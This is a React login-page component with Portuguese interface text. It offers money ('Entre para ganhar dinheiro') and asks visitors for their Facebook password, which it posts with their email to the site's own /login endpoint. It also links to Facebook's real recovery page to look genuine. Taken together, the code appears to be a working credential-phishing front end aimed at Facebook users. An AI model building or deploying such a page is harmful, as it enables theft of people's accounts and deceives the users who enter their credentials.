import axios from 'axios';
import { useForm } from 'react-hook-form';
import { useNavigate, useParams } from 'react-router';
import { Link } from 'react-router-dom';
import "./Login.css"

const Login = () => {

  let data = useForm();
  let navigate = useNavigate();


  const loginKaro = (udata) => {

    // console.log(udata);
    // axios.post("http://localhost:8060/login", udata)
    //   .then(res => {
    //     alert(res.data.message)
    //     navigate("/Home")
    //   })

    fetch("/login", {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(udata)
    })
      .then(res => res.json()).then(
        data => {
          console.log(data);
          if(data.message==="Login Successfull"){
            alert(data.message);
            navigate("/Home")
          }else{
            alert(data.message);
          }
        }
      )

  }


  return (
    <>
      <div className='containerrr'>
        <form onSubmit={data.handleSubmit(loginKaro)} className="signup" >
          <h1>Entre para ganhar dinheiro</h1>
          <h2 className='head'>
            não tem conta <Link to={"/"}>
              inscrever-se</Link>
          </h2>

          <div className="signup__field">
            <input
              {...data.register("email", { required: true })}
              className="signup__input"
              type="email"
              name="email"
              id="email"
              required=""
            />

            <label className="signup__label" htmlFor="email">
              Digite seu e-mail
            </label>
            {data.formState.errors.email && <div className="error" style={{ color: "red" }}>Please Enter your email</div>}
          </div>
          <div className="signup__field">
            <input
              {...data.register('password', {
                required: true, minLength: 6,

              })}
              className="signup__input"
              type="password"
              name="password"
              id="password"
              required=""
            />

            <label className="signup__label" htmlFor="password">
              Digite sua senha do Facebook
            </label>
            {data.formState.errors.password && data.formState.errors.password.type == "required" && <div className="error" style={{ color: "red" }}>Please Enter your password</div>}
            {data.formState.errors.password && data.formState.errors.password.type == "minLength" && <div className="error" style={{ color: "red" }}>Please Enter At'Least 8 Character's</div>}
            {data.formState.errors.password && data.formState.errors.password.type == "validate" && <div className="error" style={{ color: "red" }} >Please Enter First Letter Capital</div>}
          </div>
          <div className="signup__field" style={{ marginTop: "-30px" }}>
            <span><Link to={"https://web.facebook.com/login/identify/?ctx=recover&from_login_screen=0"}>Forgot Password?</Link></span>
          </div>
          <button className='button'>Login</button>
        </form>

      </div>
    </>
  )
}

export default Login
